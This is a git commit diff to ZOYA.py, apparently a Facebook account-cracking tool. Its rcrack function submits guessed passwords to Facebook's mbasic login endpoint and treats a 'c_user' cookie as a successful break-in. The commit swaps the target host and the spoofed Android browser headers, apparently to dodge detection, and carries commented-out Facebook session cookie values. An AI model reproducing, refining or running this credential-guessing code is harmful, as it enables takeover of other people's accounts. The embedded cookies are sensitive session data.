f47d91c01f7a406e68a48a45177626f1b33b5318
CHULBULII <163630910+CHULBULII@users.noreply.github.com>
2024-03-30 01:51:20 +0530

    Update ZOYA.py

--- ZOYA.py
+++ ZOYA.py
@@ -290,29 +290,29 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.alpha.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
     'method': 'POST',
     'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
     'scheme': 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=4Aj2ZebG0bmirfc9ZYVLBGhF; sb=4Aj2ZchopWPNz-T8H2xjMLbj; ps_l=0; ps_n=0; locale=bn_IN; vpd=v1%3B624x360x1.7004296779632568; wl_cbv=v2%3Bclient_version%3A2437%3Btimestamp%3A1710623150; m_pixel_ratio=1.7004296779632568; wd=423x734; fr=0xCgpQlCNOxvcJA0c.AWVcaA9xLu5EUTw7J_YXMbIY0uY.Bl9gjg..AAA.0.0.Bl-K1w.AWUhXyWckd4',
-    'dpr': '2',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"TECNO CB7"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"9.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
+   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+     'accept-language': 'en-US,en;q=0.9',
+     'cache-control': 'max-age=0',
+     # 'cookie': 'datr=xBcHZnD_i7cMjgY1AcmE0eg5; sb=xBcHZt5FmZMEKQ0h8xbx4U8g; m_pixel_ratio=3; wd=360x690; fr=0w4BPqXQi59wFXNea..BmBxfE..AAA.0.0.BmBxfH.AWXaEHVBovY; ps_l=0; ps_n=0',
+     'dpr': '3',
+     'sec-ch-prefers-color-scheme': 'light',
+     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+     'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+     'sec-ch-ua-mobile': '?1',
+     'sec-ch-ua-model': '"CPH2251"',
+     'sec-ch-ua-platform': '"Android"',
+     'sec-ch-ua-platform-version': '"13.0.0"',
+     'sec-fetch-dest': 'document',
+     'sec-fetch-mode': 'navigate',
+     'sec-fetch-site': 'none',
+     'sec-fetch-user': '?1',
+     'upgrade-insecure-requests': '1',
+     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+     'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -340,4 +340,4 @@ def rcrack(uid,pwx,tl):
         pass
 
 o()
-	      
+		       
